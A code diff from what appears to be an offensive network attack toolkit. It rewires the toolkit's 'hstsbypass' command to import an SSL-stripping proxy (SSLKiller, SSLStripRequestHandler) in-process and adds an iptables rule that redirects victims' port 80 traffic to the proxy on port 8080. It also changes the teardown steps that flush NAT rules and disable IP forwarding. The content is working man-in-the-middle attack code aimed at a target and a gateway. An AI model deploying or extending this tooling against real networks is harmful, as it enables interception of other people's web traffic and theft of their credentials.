@@ -108,7 +108,6 @@ class Processor(object):
 						if self.dnsdrop_status == 1:
 							self.dos.dnsdropstop()
 						if self.sslkill_status == True:
-							self.pskill(self.p1.pid)
 							print "[*] SSLKill finalized."
 					                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                 					os.system('iptables -t nat -F')
@@ -121,10 +120,11 @@ class Processor(object):
 					elif self.command == "hstsbypass":
 						if self.targets and self.gateway and self.interface:
 							try:
-								#Start subprocess with shell=True with sslkill
-					               	       	with open("{}/log/sslkill.log".format(self.path), "a+") as stdout:
-        	                       					self.p1 = subprocess.Popen(["python {}/modules/sslkill.py -i {} -t {} -g {}".format(self.path, self.interface, self.targets, self.gateway),"sslkill"], shell=True, stdout=stdout, stderr=stdout)
-									self.sslkill_status = True
+								from modules.sslkill import Proxy,SSLKiller,SSLStripRequestHandler
+								self.sslkill_status = True
+						                sslkill = SSLKiller(self.interface, self.targets, self.gateway)
+                						os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
+                						Proxy(HandlerClass=SSLStripRequestHandler)
 								print "[*] SSLKill initialized"
 								print "      |_by: m4n3dw0lf"
 							except Exception as e:
@@ -1025,7 +1025,6 @@ class Processor(object):
 			if self.dnsdrop_status == 1:
 				self.dos.dnsdropstop()
 			if self.sslkill_status == True:
-				self.pskill(self.p1.pid)
 				print "[*] SSLKill finalized."
                                 os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                                 os.system('iptables -t nat -F')
